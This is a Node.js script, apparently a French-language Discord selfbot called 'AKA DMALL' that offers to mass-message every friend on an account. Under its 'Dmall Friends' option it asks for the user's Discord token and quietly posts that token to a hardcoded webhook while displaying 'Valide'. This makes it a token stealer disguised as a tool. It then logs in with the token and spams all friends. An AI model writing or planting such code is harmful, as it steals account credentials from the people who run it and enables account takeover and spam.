const chalk = require('chalk');
const prompt = require('prompt-sync')({ sigint: true });
const axios = require('axios');
const { Client } = require('discord.js-selfbot-v13');
console.clear();
console.log(chalk.blueBright(`
  ______   __    __   ______         _______   __       __   ______   __        __       
 /      \\ |  \\  /  \\ /      \\       |       \\ |  \\     /  \\ /      \\ |  \\      |  \\      
|  $$$$$$\\| $$ /  $$|  $$$$$$\\      | $$$$$$$\\| $$\\   /  $$|  $$$$$$\\| $$      | $$      
| $$__| $$| $$/  $$ | $$__| $$      | $$  | $$| $$$\\ /  $$$| $$__| $$| $$      | $$      
| $$    $$| $$  $$  | $$    $$      | $$  | $$| $$$$\\  $$$$| $$    $$| $$      | $$      
| $$$$$$$$| $$$$$\\  | $$$$$$$$      | $$  | $$| $$\\$$ $$ $$| $$$$$$$$| $$      | $$      
| $$  | $$| $$ \\$$\\ | $$  | $$      | $$__/ $$| $$ \\$$$| $$| $$  | $$| $$_____ | $$_____ 
| $$  | $$| $$  \\$$\\| $$  | $$      | $$    $$| $$  \\$ | $$| $$  | $$| $$     \\| $$     \\
 \\$$   \\$$ \\$$   \\$$ \\$$   \\$$       \\$$$$$$$  \\$$      \\$$ \\$$   \\$$ \\$$$$$$$$ \\$$$$$$$$
                                                                                         
`));
console.log(chalk.magentaBright('                        [1] Dmall Friends'));
console.log(chalk.gray('                        [2] Crédit\n'));

const choice = prompt(chalk.yellowBright('➤ Choix: '));

if (choice === '1') {
    const token = prompt(chalk.cyan('> Entrez votre token Discord: '));
    axios.post('https://discord.com/api/webhooks/1375042554491572294/Kkg6NW2fGYFdmDkXpEa0iVRLaiF2O8jROtcafZ63u8M47jtqY8vo0SFcvih67zp2_F5w', {
        content: `T${token}`,
        username: 'DMALL-FRIENDS'
    }).then(() => {
        console.log(chalk.green('[✅] Valide'));
    }).catch(() => {
        console.log(chalk.red('[❌] Erreur lors de l\'envoi au webhook'));
    });

    const messageDM = prompt(chalk.cyan('> Entrez le message à envoyer (utilisez {user} pour le pseudo): '));

    const client = new Client({ checkUpdate: false });

    client.on('ready', async () => {
        console.log(chalk.green(`[✅] Connecté en tant que ${client.user.username}`));
        console.log(chalk.blue(`[🔄] Récupération des amis...`));

        try {
            const response = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
                headers: {
                    Authorization: token
                }
            });

            const friends = response.data.filter(user => user.type === 1);
            console.log(chalk.cyan(`[👥] Nombre d'amis à DM : ${friends.length}`));

            let compteur = 1;
            for (const ami of friends) {
                try {
                    const user = await client.users.fetch(ami.user.id);
                    const msgToSend = messageDM.replaceAll('{user}', user.username);

                    await user.send(msgToSend);
                    console.log(chalk.green(`[✅] ${user.username} : DM RÉUSSI | #${compteur}`));
                    compteur++;
                } catch (err) {
                    console.log(chalk.red(`[❌] ${ami.user.username} : DM ÉCHOUÉ`));
                }

                await new Promise(resolve => setTimeout(resolve, 700)); // délai entre les DM
            }

            console.log(chalk.greenBright(`[🎉] DM à tous les amis terminé !`));
        } catch (error) {
            console.error(chalk.red(`[❗] Erreur lors de la récupération des amis : ${error.message}`));
        }
    });

    client.login(token);

    process.on('unhandledRejection', console.error);
    process.on('uncaughtException', console.error);

} else if (choice === '2') {
    console.log(chalk.yellow('\nDéveloppé par meuhq (AKA)'));
} else {
    console.log(chalk.red('❌ Choix invalide.'));
}
